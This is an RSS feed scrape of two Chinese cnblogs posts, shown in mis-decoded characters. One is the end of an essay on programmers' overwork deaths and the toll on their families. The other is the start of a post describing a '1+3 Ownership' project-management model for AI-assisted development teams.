<p class="md-end-block md-p"><span class="md-plain">çµæ¢¯éï¼ä»çªç¶æåæ½æï¼å¦»å­æ¼å°½å¨åæä»æå°çµæ¢¯å¤ï¼é»å±ä»¬æ¥ååå¿èºå¤èï¼ç´å°ææ¤è½¦èµ¶æ¥ï¼å¯è¿ä¸åï¼é½æ²¡è½çä½ä»ççå½ãä»æ©ä¸8ç¹58åæ¨æ120ï¼å°ä¸å1ç¹å®£åä¸´åºæ­»äº¡ï¼ç­ç­åä¸ªå¤å°æ¶ï¼ä¸ä¸ªé²æ´»çäººï¼å°±æ°¸è¿å°ç¦»å¼äºãæ´ä»¤äººå¿ç¼çæ¯ï¼å¨ä»è¢«æ¢æçè¿ç¨ä¸­ï¼è¿è¢«è«åæå¥äºä¸ä¸ªå·¥ä½ç¾¤ï¼å¨ä»ç¦»ä¸å«ä¸ªå°æ¶åï¼è¿æä¸ç¥æçåäºåæ¥æ¶æ¯ï¼ææä»âå¨ä¸ä¸æ©ææ¥ä»»å¡ï¼ä»å¤©éªè´§ä¸è¿ï¼è¦æè¿ä¸ªæ¹ä¸âã</span></p>
<p class="md-end-block md-p"><span class="md-plain">æ²¡æäººç¥éï¼ä»åä¸çé£ä¸å»ï¼å¿éå¨æ³ä»ä¹ãæ¯è¿æ²¡å®æçå·¥ä½ï¼æ¯è¿æ²¡æ¥å¾åéªä¼´çå¦»å­ï¼è¿æ¯é£ä¸ªä»ä¸ç´æ³å¥½å¥½å­é¡ºçç¶æ¯ï¼ä»æ¾å¨16å²çæ¥è®°éåä¸âå½è¿åæ«æè®©ææ¢æ¢æé¿ï¼è¦åªåï¼åªåååªåâï¼ä»åå°äºï¼åªåææ¼ï¼åªåæ¿æï¼å´å¯ç¬å¿äºï¼åªåçåæï¼æ¯æ´»çãä»çå¦»å­è¯´ï¼å ä¹æ¯å¤©æä¸ï¼å¥¹é½ä¼å¬ä»åå®¶ï¼ä»æä¸ä¹ç¹ç­å°åæ¨ï¼ä»æ»¡å¿æå¾ç­å°æ»¡å¿çµæï¼é£äºâé©¬ä¸åå®¶ï¼é£å¥èæ¥âçæ¿è¯ºï¼é£äºâè§£å®è¿ä¸ªbugå°±åâçæ·è¡ï¼å°æåï¼é½åæäºåä¹æ æ³å®ç°çéæ¾ãä»å·¥ä½ä¸çä¸åå±å¹ãå©çº±ç§ãè£èªè¯ä¹¦ï¼è¿æé£å¼ ç¨æ¥åä¼çè¡ååºï¼é½è¿å¨ï¼å¯é£ä¸ªåªåä¸è¿ãè§ä¹åä¸ºçç·äººï¼åä¹ä¸ä¼åæ¥äºã</span></p>
<p class="md-end-block md-p"><span class="md-plain">è29å²çå­æï¼ä»çæäºï¼æ´æ¯è®©æ æ°äººç ´é²ãä»æ©å¹´ä¸§æ¯ï¼æ¯ç¶äº²åå§å§å«è¾è¹è¦æä»æå»æäººï¼å¥½ä¸å®¹æèä¸å¤§å­¦ï¼è¿èµ´æ·±å³ææ¼ï¼ç»å»ºäºèªå·±çå°å®¶ï¼æäºå¯ç±çå¥³å¿ï¼å¦»å­åæä¸äºäºèï¼æ¬ä»¥ä¸ºæ¥å­ä¼è¶æ¥è¶å¥½ï¼å¯å½è¿å´ç»äºä»ææ®å¿çä¸å»ãäºååä¸æ®µæ¶é´ï¼å ä¸ºé¡¹ç®ç´§æ¥ï¼ä»é¢ç¹å ç­å°æ·±å¤ï¼äºåå½å¤©ä¸­åï¼è¿ä¸å£å®ç¨³é¥­é½æ²¡åï¼æä¸å«ç¹å¤ææçç²æ«çèº«èº¯åå®¶ï¼å¯å³ä¾¿åå°å®¶ï¼å·¥ä½ä¹æ²¡æåæ­¢ãä»èº«ä½æ©å·²ååºäºé¢è­¦ï¼å´è¿æ¯å¼ºæçå¤çå·¥ä½ï¼ç´å°æ·±å¤åä¸ç¹åï¼æ¯«æ å¾åå°åå¨äºæ´æé´éï¼çè³åºç°äºå°¿å¤±ç¦ççç¶ââé£ä¸å»ï¼ä»è¯¥æå¤çè¦ï¼æå¤ä¸çã</span></p>
<p class="md-end-block md-p"><span class="md-plain">ä»èµ°åï¼çä¸çæ¯ä¸ä¸ªæ¯ç¦»ç ´ç¢çå®¶ãæå­ä¸ä¸ªæçå¦»å­ï¼æºçå¤§èå­ï¼æ¢è¦æ¿åä¸§å¤«ä¹çï¼åè¦æå¿æªæ¥ççè®¡ï¼è¿è¦ç§é¡¾å¹´å¹¼çå¥³å¿åå¹´è¿çå¬å¬ï¼äºå²çå¥³å¿ï¼è¿ä¸æâæ­»äº¡âæ¯ä»ä¹ææï¼æè®¸æ¯å¤©è¿å¨é¨å£ç­çç¸ç¸åå®¶ï¼åä¸å£°âç¸ç¸âï¼å¹´è¿çèç¶äº²ï¼ä½å¼±å¤çï¼å¤±å»äºå¯ä¸çä¾é ï¼å¾åçæ¥å­ï¼åªè½å¨æå¿µåçªè¿«ä¸­åº¦è¿ãè¿ä¸ªå®¶ï¼æ²¡æå­æ¬¾ï¼åªæä¸è¾äºæçå¥çè½¿è½¦ï¼æ¯ä»ä»¬å¯ä¸çèµäº§ï¼èä»æ¼å½å ç­æ¢æ¥çæ¶å¥ï¼ä»æ¥é½æ²¡æçæ­£æèµ·è¿ä¸ªå®¶ï¼åèè®©è¿ä¸ªå®¶ï¼å½»åºé·å¥äºç»å¢ãè¿ä»½ç»æä¸æ å¥ï¼ä¹æ³ä¸­äºå¨ç½æ æ°æ®éäººçå¿å£°ï¼è¯è®ºåºéï¼å¤ªå¤åä»ä»¬ä¸æ ·å¨çæ´»éè´éåè¡çäººï¼çº·çº·åä¸äºèªå·±çæ£æï¼æ¯ä¸æ¡çè¨ï¼é½èçä¸ä¸ºäººç¥çç²æ«ã</span></p>
<p class="md-end-block md-p"><span class="md-plain">æç¨åºåçè¨è¯´ï¼âæä»¬æ¯å¤©æ©ä¸å«ç¹ä¸ç­ï¼æä¸åç¹ãåä¸ç¹ä¸ç­ï¼çè³åæ¨ä¸ä¸¤ç¹æè½åå®¶ï¼ä¸å¨å·¥ä½å­å¤©ï¼å¶å°å¨æ¥è¿è¦å ç­ï¼å¤ååäºåç­ãç­äºååæ¯å¸¸æï¼ä¹åä¸å¨çè°è¹ãç¬çº¢çåç¼ãè¶æ¥è¶ç§çå¤´é¡¶ï¼è¿æåä¸å£å°±åé¸çèï¼å¤±ç å°å¤©äº®çå¤æï¼é½æ¯æä»¬çæ éãæä»¬ä¸æ¯ä¸æï¼æ¯ä¸æ¢åââæè¢«è£åï¼æèµä¸å°é±ï¼æç»ä¸äºå®¶äººæ´å¥½ççæ´»ï¼æèªå·±ä¸æ¦æ¾æï¼å°±ä¼è¢«è¿ä¸ªç¤¾ä¼æ·æ±°ï¼è¿åæ¯çèµæ ¼é½æ²¡æâãè¿æå¾å¤å¶ä»è¡ä¸çäººï¼éçå±å¹è¯è¯´çèªå·±çå°å¢ï¼å­å­æ³å¿ï¼âææ¯åæ°åªä½çï¼æ¯å¤©è¢«ç­ç¹ãéé¢ãæçè¿½çè·ï¼ç¬å¤åç¨¿ãæ¹ç¨¿æ¯å¸¸æï¼ç»å¸¸å¯¹çç©ºç½ææ¡£åå°åæ¨ï¼åçåå¡ç¡¬æï¼åªæåç§æåï¼åªè¦æ²¡åä¸ï¼å°±ä¸æ¢åæ´âï¼âææ¯åéå®çï¼ä¸ºäºä¸ç»©ï¼æ¯å¤©éªå®¢æ·åéãè·å¸åºï¼ä¸é¤ä¸å®ï¼èæ©å°±åäºï¼ææ¶åå¿å°ä¸æ´å¤©åä¸ä¸ä¸å£æ°´ï¼æ·±å¤ééºéºåå®¶ï¼è¿æ´æ¼±çåæ°é½æ²¡æï¼åªè½åå¤´å°±ç¡âï¼âææ¯åæå¸çï¼ç½å¤©ä¸è¯¾ãæ¹æ¹ä½ä¸ï¼æä¸è¿è¦å¤è¯¾ãå¤çå­¦ççäºæï¼ç»å¸¸ç¬å¤å°æ·±å¤ï¼è¿éªä¼´èªå·±å­©å­çæ¶é´é½æ²¡æï¼ææ¶åå­©å­ç¡çäºæåå®¶ï¼æ³æ±æ±ä»é½æåµéï¼æææ¯éªå«äººçå­©å­æé¿ï¼å´ç¼ºå¸­äºèªå·±å­©å­çç«¥å¹´âï¼è¿æèåºå¦å¦çè¨ï¼âä¸è¾¹æ¯æ¾ä¸ä¸çå·¥ä½ï¼ä¸è¾¹æ¯èä¸å¾çå­©å­ï¼æ¯å¤©åä¸ªéèºä¸æ ·è¿è½´è½¬ï¼å ç­å°æ·±å¤åå®¶ï¼ççå­©å­çç¡çè¸ï¼æ»¡å¿æ§çï¼å¯è½¬å¤´ç¬¬äºå¤©ï¼è¿æ¯è¦å¬çæ©èµ·èµ¶å»ä¸ç­ï¼æè¢«è¯´å¼é¡¾ä¸å¥½å®¶åº­åå·¥ä½ï¼æ´æå¤±å»è¿ä»½è½ç»å­©å­é®é£æ¡é¨çæ¶å¥âãè¿äºç»ç¢åçå®çæ¥å¸¸ï¼åä¸ä½ç¨åºåçæ²å§éå å¨ä¸èµ·ï¼è®©æä»¬ä¸å¾ä¸æ¿è®¤ï¼æä»¬é½å¨ä»¥ä¸åçæ¹å¼ï¼éæ¯çèªå·±çå¥åº·ï¼è´éåè¡ã</span></p>
<h4 class="md-end-block md-heading"><span class="md-plain">æä»¬é½ä¸æ ·ï¼é½æ¯å¨çæ´»éå¥åæ£æçæ®éäººã</span></h4>
<p class="md-end-block md-p"><span class="md-plain">çæ¯äºè¯è®ºåºéé£äºæ³å¿ççè¨ï¼ååæä¸ä½å¹´è½»ç¨åºåçæ²å§ï¼æ´è½è¯»æè¿ä»½æ£æèåçå¿é¸ââæä»¬æ»ä»¥ä¸ºï¼åªè¦æ¼å½åªåï¼åªè¦å¤èµä¸ç¹é±ï¼å°±è½å®æ¤å¥½èªå·±æ³å®æ¤çäººï¼å°±è½è¿ä¸èªå·±æ³è¦ççæ´»ãæä»¬æ»å¨éæ¯èªå·±çèº«ä½ï¼æ»å¨å®æ°èªå·±âåæ¼ä¸ä¸ï¼åç¬ä¸ä¸ï¼ç­ä»¥åå°±å¥½äºâï¼å´å¿äºï¼èº«ä½ä»æ¥é½ä¸æ¯éåçï¼å®æèªå·±çåºçº¿ï¼ä¸æ¦çªç ´ï¼å°±åä¹æ æ³æ½åãæä»¬æ¼å½è¿½æ±çè´¢å¯ãå°ä½ãè£èªï¼å¨çå½é¢åï¼é½æ¾å¾é£ä¹å¾®ä¸è¶³éï¼æä»¬è´¹å°½å¨åæ³è¦å®æ¤çå®¶ï¼ä»æ¥é½ä¸éè¦æä»¬ç¨çå½å»æ¢ââå¯¹äºå®¶äººæ¥è¯´ï¼ä½ å¹³å®å¥åº·å°æ´»çï¼æ¯ä»ä¹é½éè¦ã</span></p>
<p class="md-end-block md-p"><span class="md-plain">é«å¹¿è¾çå¦»å­è¯´ï¼å¦ææ¶é´å¯ä»¥åæµï¼å¥¹ä¸å®åæè®©ä»è¾æå·¥ä½ï¼åªæèµå¾å°ä¸ç¹ï¼åªææ¥å­è¿å¾è¦ä¸ç¹ï¼åªè¦ä»è½å¹³å®å¥åº·å°±å¥½ï¼å­æçå¦»å­ï¼æºçå¤§èå­ï¼å¨æ·±å¤éé»é»æµæ³ªï¼å¥¹ä¸å®æ æ°æ¬¡æ³è¿ï¼å¦æä¸å¤«æ²¡æé£ä¹æ¼å½ï¼å¦æä¸å¤«è½å¥½å¥½ç§é¡¾èªå·±ï¼æ¯ä¸æ¯ä¸åé½ä¼ä¸ä¸æ ·ãå¯ä¸ä¸æ²¡æå¦æï¼çå½ä¹æ²¡æéæ¥çæºä¼ï¼é£äºå ä¸ºéæ¯èº«ä½çä¸çéæ¾ï¼é£äºå ä¸ºçªç¶ç¦»ä¸å¸¦æ¥çä¼¤çï¼ä¼æ°¸è¿å»å¨å®¶äººçå¿éï¼ä¸è¾å­é½æ æ³æåã</span></p>
<p class="md-end-block md-p"><span class="md-plain">è¯è®ºåºéï¼æä¸æ¡çè¨ï¼è®©æå°è±¡æ·±å»ï¼âä»¥åæ»è§å¾ï¼æ­»äº¡ç¦»æä»¬å¾è¿ï¼ç´å°çå°è¿ä¸èµ·æ²å§ï¼ææç½ï¼æå¤åæå¤©ï¼ä»æ¥é½ä¸ç¥éåªä¸ªä¼åæ¥ãæä»¬æ»å¨ä¸ºäºçæ´»æ¼å½ï¼å´å¿äºï¼å¥½å¥½æ´»çï¼ææ¯æåºæ¬çåºæ°âã</span></p>
<h4 class="md-end-block md-heading"><span class="md-plain">æ¯åï¼æä»¬åªåå·¥ä½ï¼æ¯ä¸ºäºæ´å¥½ççæ´»ï¼èä¸æ¯ä¸ºäºæ¯æçæ´»ï¼æä»¬æ¼å½èµé±ï¼æ¯ä¸ºäºå®æ¤å®¶äººï¼èä¸æ¯ä¸ºäºè®©å®¶äººæ¿åå¤±å»æä»¬ççè¦ã</span></h4>
<p class="md-end-block md-p"><span class="md-plain">2026å¼å¹´çè¿ä¸èµ·æ²å§ï¼ä»æ¥é½ä¸æ¯å¶ç¶ï¼ä¹ä¸ä»ä»æ¯ç¨åºåè¿ä¸ªè¡ä¸çå°å¢ï¼å®æ¯æ æ°å½ä»£æ®éäººçç¼©å½±ââæä»¬è¢«çæ´»è£¹æï¼è¢«ååè¿½èµ¶ï¼ä¸æ¢åï¼ä¸æ¢æ­ï¼å´å¨ä¸ç¥ä¸è§ä¸­ï¼éæ¯çèªå·±çå¥åº·ï¼æ¶èçèªå·±ççå½ãè¿ä¸æ¯æä»¬æ³è¦ççæ´»ï¼ä¹ä¸æ¯æä»¬æ¼å½åªåçæä¹ã</span></p>
<p class="md-end-block md-p"><span class="md-plain">ä»å¤©ï¼æä¸æ³èèåºåå·ï¼ä¸æ³è°KPIï¼ä¹ä¸æ³æè´£è°çè¿éï¼æåªæ³åçè¿ä¸èµ·ä»¤äººå¿ç¢çæ²å§ï¼è·æ¯ä¸ä¸ªå¨çæ´»éå¥åå¥è·çæ®éäººï¼è¯´ä¸å¥å¿éè¯ï¼è¯·åä¸ä½ ååçèæ­¥ï¼å¥½å¥½ç§é¡¾èªå·±çèº«ä½ï¼è¯·å«åéæ¯å¥åº·ï¼å«åæ¿çå½èµæå¤©ã</span></p>
<p class="md-end-block md-p"><span class="md-plain">ä½ å¯ä»¥åªåï¼ä½è¯·ä¸è¦æ¼å½ï¼ä½ å¯ä»¥ä¸è¿ï¼ä½è¯·è®°å¾å³é¸ç»åãç´¯äºï¼å°±æ­ä¸æ­ï¼å¥½å¥½ç¡ä¸è§ï¼é¥¿äºï¼å°±å¥½å¥½åä¸é¡¿é¥­ï¼å«æ»æâå¿ââæ²¡æ¶é´âæå¨å´è¾¹ï¼å«æ»æå®¶äººççµææå¨èåï¼å«ç­èº«ä½ååºäºå¼ºççé¢è­¦ï¼å«ç­æå¤åçï¼æåæè«åã</span></p>
<p class="md-end-block md-p"><span class="md-plain">è¿ä¸é´ï¼æ²¡æä»ä¹æ¯çå½æ´çè´µï¼æ²¡æä»ä¹æ¯å¥åº·æ´éè¦ãæ¿è¿ä¸èµ·æ²å§ï¼è½ç»æ¯ä¸ä¸ªæ®éäººæ²åè­¦éï¼æ¿æ¯ä¸ä¸ªåªåçæ´»çäººï¼é½è½å®ä½èªå·±çå¥åº·ï¼å®ä½èªå·±çå®¶äººï¼æ¿æä»¬é½è½æç½ï¼å¥½å¥½æ´»çï¼å°±æ¯å¯¹çæ´»æå¥½çç­ç±ï¼å°±æ¯å¯¹å®¶äººæå¥½çå®æ¤ã</span></p>
<p class="md-end-block md-p md-focus"><span class="md-plain md-expand">åç»­ï¼æè¿ä¼ç»§ç»­åå¤§å®¶èèè¿ä¸èµ·äºä»¶èåæ´æ·±å±çæèï¼èèæä»¬æ®éäººè¯¥å¦ä½å¨ååä¹ä¸ï¼å®ä½å¥åº·ãå®ä½åºçº¿ãä¹æ¬¢è¿å¤§å®¶å¨è¯è®ºåºç»§ç»­çè¨ï¼è¯´è¯´ä½ çæäºï¼è°è°ä½ çææï¼æ¿æä»¬é½è½å¨å½¼æ­¤çè¯è¯´éï¼æ¾å°åéï¼å¥½å¥½çæ´»ï¼å¹³å®é¡ºéã</span></p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-30 19:11">2026-01-30 19:11</span>&nbsp;
<a href="https://www.cnblogs.com/philry">AIå¤§èæ2ç¹0</a>&nbsp;
éè¯»(<span id="post_view_count">151</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19540878);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19540878', targetLink: 'https://www.cnblogs.com/philry/p/19540878', title: 'çäºï¼å³äº2026å¼å¹´3ä½ç¨åºåæ¥è¿çæ­»äºä»¶å¯¹æ®éäººçå¯ç¤ºå½ä¸' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ AIæ¶ä»£çé¡¹ç®ç®¡çï¼1+3Ownershipæ¨¡å¼åé¡¹ç®ç®¡ç ]]></title>
    <link>https://www.cnblogs.com/zer0Black/p/19555418</link>
    <guid>1e47410fb53aa8541807a43f8928be73</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/zer0Black/p/19555418" title="åå¸äº 2026-01-30 18:30">
    <span role="heading" aria-level="2">AIæ¶ä»£çé¡¹ç®ç®¡çï¼1+3Ownershipæ¨¡å¼åé¡¹ç®ç®¡ç</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="é¡¹ç®ç®¡ç-aiå¼å-å¢éåä½">é¡¹ç®ç®¡ç #AIå¼å #å¢éåä½</h1>
<p>éå¯¹ä¸­å¤§åäº¤ä»åé¡¹ç®ï¼AIæ¶ä»£ä»£ç æå¶å»ä»·ï¼ä»ä¹æ ·çå¼åæ¨¡å¼è½ééé¡¹ç®äº¤ä»å¢éï¼å¦ä½åå°å¢éé´é¢ç¹æ²éæé«çææ¬ï¼1+3 Ownershipæ¡æ¶æè§£ãè¶çº§ä¸ªä½ãï¼è®©æ®éå¢éä¹è½å®ç°AIåçå¼åã</p>
<p>æ¬ææè·¯ä¸»è¦æ ¹æ®çå¸é©¬å·¥åæçtri-ownershipæ¨¡åè¿è¡äºéåå¬å¸çééåæ¹è¿ï¼å½åä¸ºï¼<code>1+3Ownershipæ¨¡å¼</code>ï¼ç»åéè¿°äºæå»ºè§è²ãéç¨æµç¨ãç»ç»è°æ´æ¹å¼ãåç»­ä¼å®åæææ¯ç¸å³ææ¡£</p>
<h2 id="ä¸æ¡æ¶æ¦è¿°">ä¸ãæ¡æ¶æ¦è¿°</h2>
<p>åé´å»ºç­è¡ä¸è§è²åå·¥ï¼1+3 Ownershipæ¡æ¶å°ãå¤´ç¼/è¶çº§ä¸ªä½ãçç«¯å°ç«¯å·¥ä½æåä¸ºä¸ä¸ªè§è²ï¼Product OwnerãTech OwnerãQuality Ownerãç±é¡¹ç®ç»çç»ä¸è§åï¼åæ¶ç®¡çå¤ä¸ªä¸äººç»æ§è¡ã</p>
<p>è¿ä¸ªæ¡æ¶çæ ¸å¿ä»·å¼æ¯ä»ä¹ï¼<strong>æä¾å¯å¤å¶çåä½æ¨¡å¼</strong>ï¼è®©æ®éå¢éä¹è½å®ç°AIåçå¼åã</p>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/646489/202601/646489-20260130182932436-193456964.png" class="lazyload"></p>
<h2 id="äºè§è²èè´£">äºãè§è²èè´£</h2>
<h3 id="é¡¹ç®ç»çæ»å·¥ç¨å¸">é¡¹ç®ç»çï¼æ»å·¥ç¨å¸ï¼</h3>
<p>æ ¸å¿èè´£æ¸æ°æäºï¼</p>
<ul>
<li>æ§å¶é¢ç®ï¼ç®¡é±</li>
<li>æè§£æ¨¡ååå°ä¸äººç»ï¼ç®¡äº</li>
<li>ç»´æ¤çæ¬èå¥åè®¡åï¼ç®¡æ¶</li>
<li>å®æå·¥æï¼ç®¡è¿åº¦</li>
<li>æ¨¡åé´è¡æ¥ååå®æï¼ç®¡åè°</li>
</ul>
<p>é¡¹ç®ç»çå°±åæ»å·¥ç¨å¸ï¼ç»ç­¹å¨å±ä½ä¸ææå·ä½æ½å·¥ã</p>
<h3 id="ä¸äººç»åå·¥">ä¸äººç»åå·¥</h3>
<h4 id="product-owneräº§åè´è´£äººpo">Product Ownerï¼äº§åè´è´£äººï¼POï¼</h4>
<p><strong>å¯¹åºè§è²</strong>ï¼å»ºç­è®¾è®¡å¸</p>
<p><strong>æ ¸å¿èè´£</strong>ï¼</p>
<ul>
<li>å®ä¹äº§å/é¡¹ç®æ¿æ¯ååä¸ä»·å¼</li>
<li>ç®¡çç¨æ·æäºãéªæ¶æ ååä¼åçº§</li>
<li>å¯¹äº§åºä»·å¼è´è´£</li>
<li>è¾åºPRDãååç¸å³äº§åºï¼å¹¶ç»ç»éæ±è¯å®¡ï¼</li>
</ul>
<p><strong>å³é®ç¹</strong>ï¼POå¯¹<strong>äº§åºçä»·å¼è´è´£</strong>ï¼èä¸æ¯å¯¹äº§åºæ¬èº«è´è´£ãPOä¸æ¯åéæ±ææ¡£çç§ä¹¦ï¼èæ¯å³å®"ä»ä¹å¼å¾å"çäººã</p>
<p><strong>äº§åºæµç¨</strong>ï¼</p>
<pre><code>åè½åè¡¨ â ä¸å¡æµç¨å¾ â PRDï¼ææ¨¡åäº§åºï¼â ååï¼è¿­ä»£ï¼æç»æåï¼ â è®¾è®¡å¾ï¼UI/UEå·¥ç¨å¸ï¼â ç¨æ·æå
</code></pre>
<p>ä¸¾ä¸ªä¾å­ï¼POå°±åå»ºç­è®¾è®¡å¸ï¼å³å®è¿æ æ¥¼ç¨æ¥åä»ä¹ï¼ä½å®ï¼ååºï¼ï¼ï¼èä¸æ¯è´è´£ç ç ã</p>
<h4 id="tech-ownerææ¯è´è´£äººto">Tech Ownerï¼ææ¯è´è´£äººï¼TOï¼</h4>
<p><strong>å¯¹åºè§è²</strong>ï¼å»ºç­å·¥ç¨å¸</p>
<p><strong>æ ¸å¿èè´£</strong>ï¼</p>
<ul>
<li>æå­æ¨¡åï¼æåè½ç¹</li>
<li>æ¶æè®¾è®¡åè¯¦ç»è®¾è®¡</li>
<li>ä»£ç reviewæ¥ååå·¥å·éå</li>
<li>ç¡®è®¤ç»èï¼å¸¦é¢Agentç¼åä»£ç </li>
<li>é¨ç½²å·¥ä½</li>
</ul>
<p><strong>äº§åºæµç¨</strong>ï¼</p>
<pre><code>è·åPRD â è¯¦ç»è®¾è®¡ï¼ä»£ç è®¾è®¡åæ°æ®åºè®¾è®¡ï¼ â TDDæµè¯ç¨ä¾
</code></pre>
<p>TOå°±åå»ºç­å·¥ç¨å¸ï¼æ ¹æ®è®¾è®¡å¸çå¾çº¸ç¡®å®æä¹æ½å·¥ï¼ç¨ä»ä¹ææï¼æä¹ç è¿é¢å¢ã</p>
<h4 id="quality-ownerè´¨éè´è´£äººqo">Quality Ownerï¼è´¨éè´è´£äººï¼QOï¼</h4>
<p><strong>å¯¹åºè§è²</strong>ï¼çç</p>
<p><strong>æ ¸å¿èè´£</strong>ï¼</p>
<ul>
<li>å¨æµç¨è´¨éæ§å¶</li>
<li>è®¾è®¡è´¨éæµç¨</li>
<li>è®¾è®¡å¤å±æ¬¡æµè¯ä½ç³»ï¼ååæµè¯ â éææµè¯ â ç«¯å°ç«¯æµè¯ï¼</li>
<li>å¯¹æå¼æµè¯</li>
</ul>
<p><strong>äº§åºæµç¨</strong>ï¼</p>
<ul>
<li><strong>åè½</strong>ï¼æµè¯ç¨ä¾ â æµè¯è¿ç¨ï¼äºº+AIï¼ â Bug â æµè¯æ¥å</li>
<li><strong>æ§è½</strong>ï¼æµè¯æ¹æ¡ â æµè¯è¿ç¨ï¼äºº+AIï¼ â æµè¯æ¥å</li>
<li><strong>å®å¨</strong>ï¼æµè¯æ¹æ¡ â æµè¯è¿ç¨ï¼äºº+AIï¼ â æµè¯æ¥å</li>
</ul>
<p>QOå°±åççï¼å¨ç¨ç¯çæ½å·¥è´¨éï¼åç°é®é¢ç«é©¬å«åæ´æ¹ã</p>
<h2 id="ä¸ai-agentçè§è²">ä¸ãAI Agentçè§è²</h2>
<p><strong>å¯¹åºè§è²</strong>ï¼æ½å·¥æ¹</p>
<p><strong>èè´£</strong>ï¼</p>
<ul>
<li>ææä»¤åä»£ç ãè·æµè¯ãçæææ¡£</li>
<li>ä¸éæç½²åæ</li>
</ul>
<p><strong>å³é®ç¹</strong>ï¼AI Agentæ¿ææç¹éçç¼ç ä»»å¡ï¼ä½å¿é¡»å¨ä¸Ownerçç¼æåçç£ä¸å·¥ä½ã</p>
<p>AI Agentå°±åæ½å·¥éï¼æå¾çº¸å¹²æ´»ï¼æçé«ä½éè¦æäººææ¥ã</p>
<h2 id="åæ¡æ¶ä¼å¿">åãæ¡æ¶ä¼å¿</h2>
<h3 id="å¯å¤å¶æ§">å¯å¤å¶æ§</h3>
<p>ä¸ä¾èµãè¶çº§ä¸ªä½/å¤´ç¼ãè¿æ ·å¤æ¯éºè§çäººæï¼ä¸ä¸ªè§è²é½æ¯å¯å¹å»çä¸ä¸æè½ã</p>
<p>ä¸ºä»ä¹è¿å¾éè¦ï¼å ä¸ºè¶çº§ä¸ªä½å¤ªé¾æ¾äºï¼èå¹å»ä¸ä¸ªä¸ä¸äººæç¸å¯¹å®¹æã</p>
<h3 id="è´¨éä¿é">è´¨éä¿é</h3>
<p>éè¿å¨æµç¨æµè¯ä½ç³»åç¬ç«QOï¼å°è´¨éå·¥ä½åæ£å°æ´ä¸ªçå½å¨æï¼èä¸æ¯éä¸­å¨æåéªæ¶ã</p>
<p>ä»¥åæ¯ä»ä¹æåµï¼æåæµè¯åç°ä¸å Bugï¼å¨å¢éä¸èµ·å ç­æ¹ãç°å¨æ¯ä»ä¹æåµï¼å¨ç¨è´¨éæ§å¶ï¼é®é¢æ©åç°æ©è§£å³ã</p>
<h3 id="å¼åæç">å¼åæç</h3>
<p>ä¸ä¸ªOwnerå¯ä»¥å¹¶åå·¥ä½ï¼AI Agentæ¿æç¹éç¼ç ä»»å¡ï¼çè®ºä¸æ¯å¤©è½å®æ2~3ä¸ªä¸å¡åè½ç¹ã</p>
<pre><code>åè½ç¹å®ä¹ä¸ºä¸ä¸ªå®æ´çãç¨æ·å¯æç¥çä¸å¡ä»·å¼ååï¼å¦ï¼
1. å¢å æ¹æ¥ç­æ°æ®ç»´æ¤åè½
2. å¤ææ¥è¡¨çæ
3. ç»å½åè½ç­å¯è¿è¡çåè½
</code></pre>
<h2 id="äºå¢éç»ç»æ¹å¼">äºãå¢éç»ç»æ¹å¼</h2>
<h3 id="å¿é¡»åªè½æ¯4ä¸ªäººå">å¿é¡»åªè½æ¯4ä¸ªäººåï¼</h3>
<p>å¨ä¸ä¸ªå¢ééï¼ä¿æ1+3çæ¨¡å¼ï¼ä½éå¯¹ä¸åçæ¨¡åï¼å¯ä»¥æ¯ä¸åçä¸äººç»ã</p>
<p>åä¸äººå¯ä»¥ç©¿æå¨ä¸åçä¸äººç»éã</p>
<p>ä¸¾ä¸ªä¾å­ï¼æ»è®¡A/B/C/Dåä¸ªæ¨¡åï¼</p>
<ul>
<li>Açä¸äººç»ï¼å¼ ä¸ï¼POï¼ãæåï¼TOï¼ãçäºï¼QOï¼</li>
<li>Bçä¸äººç»ï¼å¼ ä¸ï¼POï¼ãèµµå­ï¼TOï¼ãçäºï¼QOï¼</li>
<li>Cçä¸äººç»ï¼å¼ ä¸ï¼POï¼ãèµµå­ï¼TOï¼ãå¨å«ï¼QOï¼</li>
<li>Dçä¸äººç»ï¼å¼ ä¸ï¼POï¼ãå­ä¸ï¼TOï¼ãå¨å«ï¼QOï¼</li>
</ul>
<p>ä¸ºä»ä¹è¦è¿æ ·è®¾è®¡ï¼çµæ´»è°éèµæºï¼é¿åæäººé²ç½®æäººå¿æ­»ã</p>
<h2 id="å­å®æ´å·¥ä½æµç¨">å­ãå®æ´å·¥ä½æµç¨</h2>
<p><img alt="image" loading="lazy" data-src="https://img2024.cnblogs.com/blog/646489/202601/646489-20260130183009706-489907842.png" class="lazyload"></p>
<p>å·ä½æææ³ï¼ç¸å³æ§è¡å·¥å·è®¾è®¡æè·¯åç»­ä¼æ´çåç¬çææ¡£ï¼è¿éä¸åèµè¿°ã</p>
<h2 id="ä¸ç»ç»æ¶æè°æ´">ä¸ãç»ç»æ¶æè°æ´</h2>
<h3 id="ä¼ ç»æ¶æé®é¢">ä¼ ç»æ¶æé®é¢</h3>
<p>ä¼ ç»çç»ç»æ¶æåå«å¦ä¸è§è²ï¼</p>
<ol>
<li>é¡¹ç®ç»ç</li>
<li>ææ¯ç»ç</li>
<li>æ¶æå¸</li>
<li>éæ±åæå¸ï¼äº§åç»çï¼</li>
<li>UI/UEè®¾è®¡å¸</li>
<li>åç«¯å·¥ç¨å¸</li>
<li>åç«¯å·¥ç¨å¸</li>
<li>ç®æ³å·¥ç¨å¸</li>
<li>æµè¯å·¥ç¨å¸</li>
<li>è¿ç»´å·¥ç¨å¸</li>
</ol>
<p>è¿ä¹å¤è§è²ï¼æ²éææ¬é«ä¸é«ï¼é«ï¼èä¸å¾å¤è§è²å¨AIæ¶ä»£å¯ä»¥åå¹¶ã</p>
<h3 id="ai-nativeæ¶æä¼å">AI Nativeæ¶æä¼å</h3>
<p>AI Nativeå¢éè°æ´åç»æå¦ä¸ï¼</p>
<ol>
